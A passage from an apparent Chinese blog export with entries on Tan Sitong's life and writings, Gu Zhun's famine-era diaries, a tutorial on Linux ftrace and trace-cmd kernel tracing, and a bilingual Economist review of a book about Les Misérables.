瞷然骄居，自以为大功者，此吾所以至耻恶湘军不须臾忘也。虽然，彼为兵者，亦可谓大愚矣。月得饷银三两余，营官又从而减蚀之，所余无几……养之如彼其薄，责之如此其厚，自非丧心病狂，生而大愚者，孰能任为兵矣？ 四十三夫心力最大者，无不可为。惟其大也，又适以召阻险：格致盛而愈多难穷之理，…… 医学盛而愈多难治之症，算学盛而愈多难取之题，治理盛而愈多难防之弊。道高一尺，魔高一丈，愈进愈阻，永无止息。然反而观之，向使不进，乃并此阻而不可得。…… 苟畏难而偷安，防害而不敢兴利，动援西国 民党之不靖，而谓不当学西法，不知正其治化日进之凭据也。即有小乱，当统千万年之全局观之，徒童窥于一孔，谓头痛医头，腹痛当医腹，遂弃置全局于不顾，此其心力，诚不足道矣！……各教教主，皆自匹夫一意孤行而创之者也。盖心力之实体，莫大于慈悲。慈悲则我视人平等，而我以无畏；人视我平等，而人亦以无畏。无畏则无所用机矣。…… 无畏有五，曰：无死畏，无恶名畏，无不活畏，无恶道畏，乃至无大众威德畏。(注：初学之菩萨，有五怖畏：一、不活畏，行布施者，恐己不能过活，而不能尽所有。二、恶名畏，恐已恶名，不能为和光同尘之行。三、死畏，虽发广大之心，然恐死而不能舍身命。四、恶道畏，恐己堕于恶道，而对治不善法。五、大众咸德畏，恐众多之人或威德之人，不能于其前为狮子吼。) 谭嗣同年谱 1866年（同治四年），生于北京宣武城南孏眠胡同（其父谭继洵时任户部主事）； 1876年（光绪二年），10岁，生母徐氏去世； 1888年（光绪十四年），23岁，在刘人熙的指导下开始研究 王夫之 等人的著作，同时搜罗和阅读介绍西方科学、史地、政治的书籍； 1895年（光绪二十一年），30岁。4月17日 《马关条约》 签署；谭满怀忧愤，在家乡组织算学社，同时在南台书院设立史学、掌故、舆地等新式课程；5月2日，康有为联合在京参加会试的1000多名举人上书，要求拒和、迁都、变法，史称“公车上书”。 1896年（光绪二十二年），31岁。2月入京，结交 梁启超、翁同龢 等人。奉父命捐赀五品知府衔，于江苏南京候补；游历天津、湖南、湖北等地；年底于南京闭门养心读书，开始创作 《仁学》 ，成2卷。 1897年（光绪二十三年），32岁。1月17日，完成 《仁学》协助湖南巡抚陈宝箴等人设立 时务学堂，筹办内河轮船、开矿、修筑铁路等新政； 1898年（光绪二十四年），33岁。年初，与唐才常在长沙组织 南学会，创办《湘报》；4月，翰林院侍读学士徐致靖推荐，光绪皇帝授予四品卿衔、任职军机处章京，参与新政；6月11日，光绪皇帝颁布“明定国是”诏书，宣布变法；9月21日，慈禧太后囚禁光绪皇帝；9月28日，在北京宣武门外的菜市口刑场就义，临刑前高呼：“有心杀贼，无力回天。死得其所，快哉快哉！”。 家庭父亲：谭继洵（1823年－1901年）字信甫、敬甫，湖南省浏阳县人。谭嗣同生母徐五缘（1829年-1876年）生两女三男；谭继洵妾卢氏亦育有三子二女。 道光二十九年（1849年）26岁中举人 咸丰十年（1860年）37岁中庚申恩科进士。 同治元年(1862年)，39岁担任户部广西司主事； 同治四年（1866年）43岁生谭嗣同（第三子）； 同治十一年(1872年)，任户部山西司员外郎； 同治十三年(1874年)，任户部山东司郎中、坐粮厅监督； 光绪三年(1877年)，任巩秦阶道员； 光绪九年(1883年)，任甘肃按察使； 光绪十年(1884年)，任甘肃布政使； 光绪十五年(1889年)，升任湖北巡抚（时任湖广总督张之洞）； 光绪二十年至二十一年底(1894年11月至1896年1月)，湖北巡抚兼署湖广总督； 光绪二十四年(1898年)戊戌变法而受株连，在湖北巡抚任上被罢官； 光绪二十七年(1901年)，卒于浏阳， 谣风遍万国九洲，无非是骂；昭雪在千秋百世，不得而知。——挽长子谭嗣同 李闰（1865 ～ 1925年），谭嗣同的夫人，咸丰进士、长沙李篁仙之女。投身公益，以家产筹办浏阳第一所女子师范学校，康有为、梁启超合送匾额“巾帼完人”。谭牺牲后，李闰自号“臾生”，表示自己含悲忍辱暂且苟活之意，并写诗道： 前尘往事不可追，一成相思一层灰 。来世化作采莲人，与君相逢横塘水。 悼念君乘大愿施无畏，立地成佛觉新民剑胆琴心仁学著，来世化作采莲人。 （注：红朝庆丰四年(2016-09-28)祭谭复生） 待续 （待续）江湖大哥：谭嗣同与江湖 （待续）冲决网罗：《仁学》是一部维新派著作吗？ （待续）亡国还是亡天下：谭嗣同是保皇党吗？ （待续）经世致用：西学与中学、政党雏形南学会 参考文献 谭嗣同不是改良派，而是革命党 剑胆琴心谭嗣同 | 中国青年网 谭嗣同与佛教 | 中国青年网 杨仁山与金陵刻经处 | 中国佛教协会 再谈谭嗣同精神 | 南方都市报，2016 殉道者谭嗣同：变法流血者，请从嗣同始！|汪兆骞 文钻阅读]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[香山野史·豪侠列传:顾准]]></title>
    <url>%2F2017%2F04%2F20%2FMrGuZhun%2F</url>
    <content type="text"><![CDATA[摘要 《顾准日记》 说明末农民战争和清军入关阻止了资本主义那一点“芽”成长起来，完全错了。清政府基本上还是恢复Ancient Regime（旧制度），所以，可以有十全武功，却永远也不会有资本主义。。。东方专制主义到明代已经穷途末路，什么道路，在儒法道佛杂糅的理教控制下是摸索不出来的。只有大炮才轰得开这个铁幕！（梁方仲论明中叶以后的经济大势） 《顾准日记》商城日记（1959.10～1960.1）十一月二十二日 晨三时半红薯叶与拉肚子第一天吃红薯叶，三顿，每饭一碗。晚间菜稀饭，加大碗红薯叶，翌晨拉肚子。20日吃红薯叶，量减半。 早饭时张哲华问，我烤了红薯，为何不取，其实这时柳学冠那个。我既与柳是同犯，也就不再检举他。张哲华质问我，我本想和盘托出，想想不好。看昨天情形，不会再有事追究，也就罢了。其实，只要有机会，无人不吃。下棚生红薯，上棚萝卜。我站岗时也吃萝卜花生。柳学冠烤的那个，竟未敢取。今天谢德征让我吃了。（p23） 十一月二十三日 上午九时半暴露思想董要求暴露思想。他嫌我暴露不够，大训一顿。此次整风特点，大约是没有右倾思想就不能过关。从今天开始，想想如何暴露法。问题恐要围绕人道主义，蔓延及于先进吃亏论等等上去。三五日内编出一套提纲。（p24） 精神折磨的痛烈之感下午栽菜上粪时，思及生活象 泥污 ，而精神上今天这个人、明天那个人来训一通，卑躬屈节，笑魇迎人已达极度，困苦嫌恶之感，痛烈之至。 十一月二十九日 晚九时半今年打下粮食，隐藏私分是普遍的，搜粮与停止供应也是不乏其例的。然而隐藏私分必定为量不多，中秋过后，吃饭问题已经紧张，征起粮食，明年供应，叫做细水长流，慢性饥饿必较今年更甚。 死人，已知柳学冠之弟，杨文华的女儿，刘方惠的父亲。其他所听说的还不少。商城全县平均土地，每人不过七八分，用这个方法解决人口问题倒也好。(p26) 杨自诩全无问题，样样都通。此人 告密 别人，鹦鹉学舌式地积极，奉承领导。论过去，是一个旧社会极世故地人。弄清本质之后，觉得可厌。（p27） 十二月一日 下午三时今天上午翻地栽菜拔菜秧。杨文华很严厉，我在翻地速度与准时上二方面并未落后。上午阴小雨，下午浇了一挑粪水（黄豆地），就在下棚“学习”，读报，我在抽空子写笔记。（p31） 十二月一日 下午九时今晚至少有二处斗争会雨雪中坚持工地工程，晚上各组发柴火烤湿衣服。菜园正在斗争柳学冠，因为他喝中药喝得不好，把药倒了。 十二月二日我的胡萝卜挨偷了被偷至少十几个。昨下午，一个妇女当着下棚许多人，偷胡萝卜。当群众饥饿的时候，如何看得住？ 十二月八日 晚六时半李宝仁曾写信给人家，说劳动队成绩是微小的，沈万山深恨此事，所以不断找她岔子。昨晚宣布李是四类，说八类也可以。他说，李宝仁说我们理论不高，我还不是要斗争你就斗你啦！如今的党性都属此类。莫看沈是粗人，他是深得毛之三昧的。毛对费孝通不也是这样说的吗？我得到了沈的表扬 沈说我“接上头”了。这其实是笑魇迎人政策的结果。我近来每见沈必招呼，他不瞅不睬我也招呼，这就合乎他的心意了。（p39） 十二月十七日 上午九时半吃饭制度的三变吃饭制度，如是已经三变。第一种制度，打在饭桶里，大家在桶里装碗。那好紧张，真是抢饭那。我吃干饭也不免少嚼急咽，还不免“干活一个不如一个，吃饭一个比一个厉害”的批评。第一种制度，在去年还行得通。粮食多，吃不饱可到工地食堂与小贩那里买鸡蛋、包子、干饭、馍馍之类吃，有人吃，也有人买。第二种制度，那是十一前夕实行的，各人一盆，实行分饭。紧张程度减轻了，可是分饭时还不免紧张得很。第三种，连分饭都不要了，定量下盆，各人直接从蒸笼里端。贫乏出办法，那倒是真的。可是以后再没有剩饭了，早起烧锅，喝碗米汤也办不到了。(p48) 1960 一月十日RELIGION社会责任感是一种崇高的感情，这时区别家雀与海燕的东西。宗教情绪是卑微的，它引导人们趋向愚昧。（p105）从昨天与一连几天的高潮来看，青年人要避免这种宗教情绪的影响是不可能的。我为什么要强制人家做一件在他无力抵抗的事呢？ 一月十七日 下午八时农民的厄运中国农民过着糊口经济的生活，他们中间的知识分子同样不懂得这个问题。他们从户口经济的立场出发，在土地革命的旗帜下做出了重大的贡献，结果是他们的救命恩人回过头来，以强力来打破糊口经济，代替圈地，代替羊子吃人的是在饥饿状态下上山炼铁，与7000万人的大兴水利。（p108） 这是一个历史的悲剧。…他们的救命恩人全然不懂得这个问题。不，或者应该说，1958年以前他不懂，以后他逐渐懂得了，并且摸索一些解决方法，他试过好几个药方，结果选择了现在的药方————马列主义的人口论，恐怖主义的反右斗争，驱饥饿的亿万农民从事于过度的劳动，以同时达到高产、高商品率的农业和消灭过剩人口————是最堂皇、又是最残酷、最迅速、最能见效的办法。若说这也将记入史册成为丰功伟绩，那确实与Peter The Great(彼得大帝)，与曹操一样。他是聪敏人，他是有意识这样做的。（p109） 一月十五日 商城城关镇 公安局派出所办户口我知道办户口是艰难的。从蔡璋那儿出来就到农场去。赵尹都在，尹给写信，我就到派出所。去时十一点半，办事人吃饭去了，要下午去。于是吃完饭，大约一时半到派出所。派出所不给办，理由是要户口底册。我知道不是户口底册的问题，而是户口迁移不该由我自己来办，于是又到农场，并且请求农场去一人帮我办。尹会计慨然答应，冒雪一同来到派出所。…… 一会尹出来，说要大队部的信。…… 我在候审室那样的小房间里等着，这也是理该如此的。但愿办户口的事情记到这里就算记完，没有其他的情节需要续记才好。否则，明天不仅我要跑一次，也许还得劳驾赵家骅或者其他的人再跑一次。（谢天谢地，赵生祥到县委组织部给我弄了介绍信，户口办妥了。） 下放干部学好了没有？下放干部是有许多人学好了，这是那套社会责任感的宗教仪式的效果。其背后也有客观的物质基础。他们是外来者，他们来此是朝圣式地消除肉欲，城市式的生活方式在等待他们。否则，饥饿也会促使他们 人相食，卖X，说谎，拍马，害人自肥 的。 真是心头一阵阵地绞痛。若说这是历史必然，付出的代价也够重大的。后一个历史时期，为了消除这些恶毒的影响，不知要付出多少精神物质的补偿。（p118） 息县日记 （北京-东岳-明港 1969.10～1971.9）北京日记 （1972.10～1974.9）]]></content>
      <tags>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术(三) ：Tracing your kernel Functions!]]></title>
    <url>%2F2017%2F04%2F17%2FDTrace_FTrace%2F</url>
    <content type="text"><![CDATA[摘要Ftrace 是一个设计用来帮助开发者和设计者监视内核的追踪器，可用于调试或分析延迟以及性能问题。ftrace 令人印象最深刻的是作为一个 function tracer，内核函数调用、耗时等情况一览无余。另外，ftrace 最常见的用途是事件追踪，通过内核是成百上千的静态事件点，看到系统内核的哪些部分在运行。实际上，ftrace 更是一个追踪框架，它具备丰富工具集：延迟跟踪检查、何时发生中断、任务的启用、禁用及抢占等。在 ftrace 的基线版本之上，还有很多第三方提供的开源工具，用于简化操作或者提供数据可视化等扩展应用。 一、IntroductionDeveloper(s): Steven Rostedt(RedHat) and othersInitial release: October 9, 2008;Operating system: Linux （merged into the Linux kernel mainline in kernel version 2.6.27）Type: Kernel extensionLicense: GNU GPLWebsite: www.kernel.org/doc/Documentation/trace 二、ABC在使用ftrace之前，需要确认调试目录是否已经挂载，默认目录：/sys/kernel/debug/ 。 debugfs是Linux内核中一种特殊的文件系统，非常易用、基于RAM，专门设计用于调试。（since version 2.6.10-rc3，https://en.wikipedia.org/wiki/Debugfs)。 1234mount -t debugfs none /sys/kernel/debug或者指定到自己的目录mkdir /debugmount -t debugfs nodev /debug 挂载之后会自动创建如下文件：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/sys/kernel/debug# ls -lrtdrwxr-xr-x. 2 root root 0 12月 28 17:24 x86drwxr-xr-x. 3 root root 0 12月 28 17:24 boot_paramsdrwxr-xr-x. 34 root root 0 12月 28 17:24 bdi-r--r--r--. 1 root root 0 12月 28 17:24 gpiodrwxr-xr-x. 3 root root 0 12月 28 17:24 usbdrwxr-xr-x. 4 root root 0 12月 28 17:24 xendrwxr-xr-x. 6 root root 0 12月 28 17:24 tracingdrwxr-xr-x. 2 root root 0 12月 28 17:24 extfragdrwxr-xr-x. 2 root root 0 12月 28 17:24 dynamic_debugdrwxr-xr-x. 2 root root 0 12月 28 17:24 hid-rw-r--r--. 1 root root 0 12月 28 17:24 sched_featuresdrwxr-xr-x. 2 root root 0 12月 28 17:24 mcedrwxr-xr-x. 2 root root 0 12月 28 17:24 kprobes-r--r--r--. 1 root root 0 12月 28 17:24 vmmemctl/sys/kernel/debug/tracing# ls -lrt-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_thresh-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_on-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_max_latency-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_enabled-rw-r--r--. 1 root root 0 12月 28 17:24 tracing_cpumaskdrwxr-xr-x. 2 root root 0 12月 28 17:24 trace_stat-r--r--r--. 1 root root 0 12月 28 17:24 trace_pipe-rw-r--r--. 1 root root 0 12月 28 17:24 trace_options--w--w----. 1 root root 0 12月 28 17:24 trace_marker-rw-r--r--. 1 root root 0 12月 28 17:24 trace_clock-rw-r--r--. 1 root root 0 12月 28 17:24 trace-rw-r--r--. 1 root root 0 12月 28 17:24 sysprof_sample_period-r--r--r--. 1 root root 0 12月 28 17:24 set_graph_function-rw-r--r--. 1 root root 0 12月 28 17:24 set_ftrace_pid-rw-r--r--. 1 root root 0 12月 28 17:24 set_ftrace_notrace-r--r--r--. 1 root root 0 12月 28 17:24 saved_cmdlines-r--r--r--. 1 root root 0 12月 28 17:24 READMEdrwxr-xr-x. 2 root root 0 12月 28 17:24 options-rw-r--r--. 1 root root 0 12月 28 17:24 function_profile_enabled-r--r--r--. 1 root root 0 12月 28 17:24 dyn_ftrace_total_info-rw-r--r--. 1 root root 0 12月 28 17:24 buffer_size_kb-r--r--r--. 1 root root 0 12月 28 17:24 available_tracers-r--r--r--. 1 root root 0 12月 28 17:24 available_filter_functions-rw-r--r--. 1 root root 0 12月 28 17:24 set_event-r--r--r--. 1 root root 0 12月 28 17:24 printk_formatsdrwxr-xr-x. 34 root root 0 12月 28 17:24 per_cpudrwxr-xr-x. 24 root root 0 12月 28 17:24 events-r--r--r--. 1 root root 0 12月 28 17:24 available_events-r--r--r--. 1 root root 0 12月 28 17:24 kprobe_profile-rw-r--r--. 1 root root 0 12月 28 17:24 kprobe_events-r--r--r--. 1 root root 0 12月 28 17:24 stack_trace-rw-r--r--. 1 root root 0 12月 28 17:24 stack_max_size-rw-r--r--. 1 root root 0 5月 31 11:50 current_tracer-rwxr-xr-x. 1 root root 0 5月 31 11:57 set_ftrace_filter 三、BASIC1. Function tracer以Function tracer为例，结果存储在 trace，该文件类似一张报表，该表将显示 4 列信息。首先是进程信息，包括进程名和PID ；第二列是CPU；第三列是时间戳；第四列是函数信息，缺省情况下，这里将显示内核函数名以及它的上一层调用函数。 12345678910111213141516cd /sys/kernel/debug/tracingecho function &gt; current_tracercat trace# tracer: function## TASK-PID CPU# TIMESTAMP FUNCTION# | | | gmond-6684 [004] 13285965.088308: _spin_lock &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088308: ktime_get_update_offsets &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088309: __run_hrtimer &lt;-hrtimer_interruptgmond-6684 [004] 13285965.088309: __remove_hrtimer &lt;-__run_hrtimergmond-6684 [004] 13285965.088309: tick_sched_timer &lt;-__run_hrtimergmond-6684 [004] 13285965.088309: ktime_get &lt;-tick_sched_timergmond-6684 [004] 13285965.088310: tick_do_update_jiffies64 &lt;-tick_sched_timergmond-6684 [004] 13285965.088310: update_process_times &lt;-tick_sched_timer 2. Function graph tracerFunction graph tracer 和 function tracer 类似，但输出为函数调用图，更加容易阅读：12345678910111213141516171819202122# tracer: function_graph## TIME CPU DURATION FUNCTION CALLS# | | | | | | | | 21) ==========&gt; | 21) | smp_apic_timer_interrupt() &#123; 31) ==========&gt; | 31) | smp_apic_timer_interrupt() &#123; 8) | smp_apic_timer_interrupt() &#123; 11) 2.598 us | native_apic_mem_write(); 18) 3.106 us | native_apic_mem_write(); 30) ==========&gt; | 30) | smp_apic_timer_interrupt() &#123; 3) 3.590 us | native_apic_mem_write(); 22) 2.944 us | native_apic_mem_write(); 7) 3.392 us | native_apic_mem_write(); 17) ==========&gt; | 17) | smp_apic_timer_interrupt() &#123; 27) ==========&gt; | 27) | smp_apic_timer_interrupt() &#123; 16) ==========&gt; | 16) | smp_apic_timer_interrupt() &#123; 四、体系结构Ftrace有两大组成部分，framework和一系列的tracer 。每个tracer完成不同的功能，它们统一由framework管理。 ftrace 的trace信息保存在ring buffer中，由framework负责管理。Framework 利用debugfs建立tracing目录，并提供了一系列的控制文件。 ftrace is a dynamic tracing system. 当你开始“ftracing”一个内核函数的时候，该函数的代码实际上就已经发生变化了。内核将在程序集中插入一些额外的指令，使得函数调用时可以随时通知追踪程序。 WARNNING:使用ftrace追踪内核将有可能对系统性能产生影响，追踪的函数越多，开销越大。使用者必须提前做好准备工作，生产环境必须谨慎使用。 12#cat available_tracers //查看支持的tracersblk kmemtrace function_graph wakeup_rt wakeup function sysprof sched_switch initcall nop 五、Useful Tools1. trace-cmdtrace-cmd是一个非常有用的Ftrace命令行工具。123sudo apt-get install trace-cmd或者git clone git://git.kernel.org/pub/scm/linux/kernel/git/rostedt/trace-cmd.git 使用方法：123456sudo trace-cmd record --help #helpsudo trace-cmd record -p function -P 123456 #record for PIDsudo trace-cmd record -p function -l do_page_fault #record for function plugin 'function'Hit Ctrl^C to stop recording trace.dat123456789101112$ sudo trace-cmd report chrome-15144 [000] 11446.466121: function: do_page_fault chrome-15144 [000] 11446.467910: function: do_page_fault chrome-15144 [000] 11446.469174: function: do_page_fault chrome-15144 [000] 11446.474225: function: do_page_fault chrome-15144 [000] 11446.474386: function: do_page_fault chrome-15144 [000] 11446.478768: function: do_page_fault CompositorTileW-15154 [001] 11446.480172: function: do_page_fault chrome-1830 [003] 11446.486696: function: do_page_fault CompositorTileW-15154 [001] 11446.488983: function: do_page_fault CompositorTileW-15154 [001] 11446.489034: function: do_page_fault CompositorTileW-15154 [001] 11446.489045: function: do_page_fault 在很有情况下不能使用函数追踪，需要依赖 事件追踪 的支持，例如： 1234567891011121314151617181920212223# cat available_events //查看支持的事件类型power:power_startpower:power_frequencypower:power_endsched:sched_kthread_stopsched:sched_kthread_stop_retsched:sched_wait_tasksched:sched_wakeupsched:sched_wakeup_newsched:sched_switchsched:sched_migrate_tasksched:sched_process_freesched:sched_process_exitsched:sched_process_waitsched:sched_process_forksched:sched_stat_waitsched:sched_stat_sleepsched:sched_stat_iowaitsched:sched_stat_runtimesudo trace-cmd record -e sched:sched_switchsudo trace-cmd report 输出如下：1234516169.624862: Chrome_ChildIOT:24817 [112] S ==&gt; chrome:15144 [120]16169.624992: chrome:15144 [120] S ==&gt; swapper/3:0 [120]16169.625202: swapper/3:0 [120] R ==&gt; Chrome_ChildIOT:24817 [112]16169.625251: Chrome_ChildIOT:24817 [112] R ==&gt; chrome:1561 [112]16169.625437: chrome:1561 [112] S ==&gt; chrome:15144 [120] 切换路径：PID 24817 -&gt; 15144 -&gt; kernel -&gt; 24817 -&gt; 1561 -&gt; 15114。 2. perf-toolsperf-tools 是性能调试大神Brendan Gregg开发的一个工具包，提供了很多强大的功能，例如：iosnoop: 磁盘I/O分析详细包括延迟iolatency: 磁盘I/O分析概要(柱状图)execsnoop: 追踪进程exec()opensnoop: 追踪open()系统调用，包含文件名killsnoop: 追踪kill()信号（进程和信号详细） 代码下载：https://github.com/brendangregg/perf-tools 123456789101112131415161718192021222324# ./execsnoop //显示新进程和参数：Tracing exec()s. Ctrl-C to end. PID PPID ARGS 22898 22004 man ls 22905 22898 preconv -e UTF-8 22908 22898 pager -s 22907 22898 nroff -mandoc -rLL=164n -rLT=164n -Tutf8 22906 22898 tbl 22911 22910 locale charmap 22912 22907 groff -mtty-char -Tutf8 -mandoc -rLL=164n -rLT=164n 22913 22912 troff -mtty-char -mandoc -rLL=164n -rLT=164n -Tutf8 22914 22912 grotty# ./iolatency -Q //测量设备I/O延迟Tracing block I/O. Output every 1 seconds. Ctrl-C to end. &gt;=(ms) .. &lt;(ms) : I/O |Distribution | 0 -&gt; 1 : 1913 |######################################| 1 -&gt; 2 : 438 |######### | 2 -&gt; 4 : 100 |## | 4 -&gt; 8 : 145 |### | 8 -&gt; 16 : 43 |# | 16 -&gt; 32 : 43 |# | 32 -&gt; 64 : 1 |# |[...] 六、可视化工具:KernelSharkKernelShark是trace-cmd的前端工具，提供了对trace.dat的可视化分析（Graph View 、List View、Simple and Advance filtering）。 扩展阅读：动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 (Key)Julia Evans:ftrace: trace your kernel functions! (Key)IBM developerWorks@刘明：ftrace简介,2009 Debugging the kernel using Ftrace - part 1 (Dec 2009, Steven Rostedt) Debugging the kernel using Ftrace - part 2 (Dec 2009, Steven Rostedt Secrets of the Linux function tracer (Jan 2010, Steven Rostedt) trace-cmd: A front-end for Ftrace (Oct 2010, Steven Rostedt) Using KernelShark to analyze the real-time scheduler (2011, Steven Rostedt) Ftrace: The hidden light switch (2014, Brendan Gregg) (Key)the kernel documentation:ftrace.txt documentation on events you can trace Documentation/events.txt some docs on ftrace design for linux kernel devs (not as useful, but interesting) Documentation/ftrace-design.txt trace-cmd图形化工具：KernelShark Youtube:ELC2011 Ftrace GUI (KernelShark) (Key)StevenRostedt:ELC2011_KernelShark(quick tutorial)(PDF) source:https://riboseyim.github.io/]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[世纪小说《悲惨世界》]]></title>
    <url>%2F2017%2F04%2F13%2FArtistic-Les-Miserables%2F</url>
    <content type="text"><![CDATA[摘要 经济学人：解读世纪小说《悲惨世界》 经济学人：解读世纪小说《悲惨世界》 Books and arts Feb 23rd 2017The Novel of the Century: The Extraordinary Adventure of Les Misérables.By David Bellos. Particular Books; 307 pages; £20.To be published in America by Farrar, Straus &amp; Giroux in March; $27. 克劳德-米歇尔·勋伯格（Claude-Michel Schönberg，1944年7月6日－），法籍犹太裔唱片录音师、演员、歌手、流行曲和音乐剧作曲家，经常和填词人阿兰·鲍伯利（Alain Boublil）合作。1987年凭借《悲惨世界》获得托尼奖（最佳原创音乐）。 “只要地球上还有无知和贫穷，”维克多·雨果在《悲惨世界》序言中写道，“这样的书就不可能是无用的。” 155年以前，在法国首次出版并传播到其他方，这部小说或者其流行普及本身从未失去它的意义。 《悲惨世界》大约有65个电影版本（最早的版本出现在1909年），使它成为有史以来改变最多的作品。第一阶段，音乐剧于1863年一月在费城开幕。自1980以来，Alain Boublil和Claude-Michel Schönberg合作的音乐歌剧已经在44个国家和349个城市上演了超过53000场次。然而，从一开始，众多的改编者和译者就得从纷繁庞杂的源头中获取素材。英国的爱好者必须等到2008年才有一个完整的英文小说文本，正如原著作者曾经期望的那样。即使对《悲惨世界》的爱好者来说，雨果震惊世界的巨著，感觉就像一个失落的大陆。 大卫·贝洛斯（David Bellos），一个出生于英国的普林斯顿大学法国文学教授，著名的翻译家，通过他的作品我们得以一窥门径，包括五个组成部分，48本书和365章，思路清晰、机智风趣。他既博学又有趣，他揭示了小说的魔力在于它的多种多样功能。雨果的非凡功绩是在拿破仑之后提供一幅“错综复杂的现实主义的法国”，“一个戏剧性的、引人入胜的书” 充满了悬念、演示了一个“慷慨的道德原则”，对今天读者的仍然具有吸引力。 雨果，当时已经是《巴黎圣母院》的作者，作为诗人、剧作家和小说家的文学巨星，于1845开始写一个前罪犯的故事，一个社会中的穷人和被遗弃者如何寻找新的生活。通过冉阿让（Jean Valjean）的生活轨迹，自1815年从废船监狱释放以来，就使他面临艰难的风险抉择，雨果编织了一个巨大而“非常紧密的“社会冲突与个人新生历程的壁毯。 1848年革命，其中激进的狂热分子发现，“他的头脑是理性的”，虽然他的心是穷人”，打断了雨果的庞大工程。它重新成为流亡作家，被新发迹的皇帝驱逐（拿破仑三世），定居在英属格恩西海峡群岛：不再是“辉煌的野心家”而是一个“独立的抗议者”。 奇怪的是，这个“英国王室的小小的封建前哨”，促成了一本书的孕育和诞生，这本书赢得了全世界的心、促进了思想的改变。珍贵手稿的编辑和打印依赖于维多利亚女王皇家邮政的计划和英属格恩西轮船时刻表。在1861年，“书籍史上最伟大的一笔交易”，雨果获得了相当于20年的主教的薪水：足够“建小铁路”。直到1862年底出版，Charles Wilbour的英文翻译版被报道是“美国历史上最大的书籍订单”。 除了雨果的文学对手（大仲马把它比作“涉水通过泥浆”），每个人都喜欢冉阿让的改过自新历程，众多的各色人物让人很快就进入民俗的世界：街上的女孩梵蒂尼，她的女儿珂赛特，海胆伽弗洛什，学生马吕斯。美国内战期间，删减了谴责奴隶制的内容之后，盗版小说甚至在南方士兵中间广为流传。一个疲惫的双关语冠以他们的指挥官的名字，他们戏称自己是“李的悲惨世界”。（南方指挥官罗伯特-李将军） 从人道地对待罪犯，再到关怀流浪儿童，《悲惨世界》带头呼吁改革，促成了“未来社会的进步”。一些书真的改变了世界。这一次，它早就打破了舞台上的票房纪录。在音乐剧中，雨果的英雄在吟诵：一首电视选秀节目选手喜爱的——“带他回家”。Bellos先生的工作毋宁说，他将“悲惨世界”从制造者和他的时代完整重现。 Economist:By the book How Victor Hugo came to write “Les Misérables”, his magnum opus The extraordinary story of a book that changed the world The Novel of the Century: The Extraordinary Adventure of Les Misérables. By David Bellos. Particular Books; 307 pages; £20. To be published in America by Farrar, Straus &amp; Giroux in March; $27. “AS LONG as there are ignorance and poverty on Earth,” wrote Victor Hugo in his preface to “Les Misérables”, “books such as this one may not be useless.” Over the 155 years since it was first published in France and then elsewhere, the novel has never lost its relevance—or its popularity. Around 65 film versions (the first in 1909) make “Les Misérables” the most frequently adapted novel of all time. The first stage musical opened in Philadelphia in January 1863. Since 1980 Alain Boublil and Claude-Michel Schönberg’s operatic melodrama has been performed more than 53,000 times in 44 countries and 349 cities. Yet, from the outset, adapters and translators cherry-picked elements from their supersized source. British admirers had to wait until 2008 for a complete English text of the novel in the order in which the author had planned it to be read. Even to lovers of “Les Mis”, Hugo’s world-shaking blockbuster can feel like a lost continent. David Bellos, an English-born professor of French literature at Princeton University and an eminent translator, navigates through its five parts, 48 “books” and 365 chapters with clarity and wit. At once erudite and entertaining, he shows how the novel’s magic lies in its multitasking versatility. Hugo’s extraordinary feat is to deliver “an intricately realistic portrait” of France after Napoleon, “a dramatic page-turner” packed with suspense—and a demonstration of “generous moral principles” that readers still find appealing today. Hugo, already the author of “Notre-Dame de Paris” and a literary superstar as a poet, playwright and novelist, began in 1845 to write his story of a former convict seeking a new life in a society rigged against the poor and outcast. Around the questing figure of Jean Valjean, freed from the prison-hulks in 1815 to make his way against the steepest odds, Hugo stitched a vast but “very tightly knit” tapestry of social strife and personal rebirth. The revolution of 1848, in which the radical firebrand discovered that “his head was with order” although his heart “was with the poor”, interrupted Hugo’s mammoth project. It resumed after the exiled writer, banished by the upstart emperor, Napoleon III, settled on the Channel Island of Guernsey: no longer a “brilliant careerist” but a “stand-alone protester”. Curiously, this “tiny feudal outpost of the British crown” hosted the gestation and birth of a book that won hearts and changed minds across the world. The editing and printing of the precious manuscript depended on the schedules of Queen Victoria’s Royal Mail and the Guernsey steamer timetables. In 1861 “the biggest deal in book history” saw Hugo paid the equivalent of 20 years of a bishop’s stipend: enough “to build a small railway”. By late 1862, the year of publication, Charles Wilbour’s English translation was reported to be “the largest order ever placed for a book in America”. Save for Hugo’s literary rivals (Alexandre Dumas likened it to “wading through mud”), everybody loved the long haul of Valjean’s rehabilitation in the company of characters who soon entered folklore: the street-girl Fantine, her daughter Cosette, the urchin Gavroche, the student Marius. Shorn of its condemnation of slavery, the novel even circulated in a pirate edition among Confederate soldiers during the American civil war. In a weary pun on their commander’s name, they dubbed themselves “Lee’s Miserables”. From the humane treatment of ex-offenders to the care of street children, “Les Misérables” spearheaded calls for reform and contributed to “the future improvement of society”. Few books really change the world. This one did, long before it broke box-office records on stage. In the musical Hugo’s hero intones—in a song loved by television talent-show contestants—“Bring Him Home”. Mr Bellos does just that, as he restores “Les Mis” to its maker and his times. This article appeared in the Books and arts section of the print edition under the headline “By the book” 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 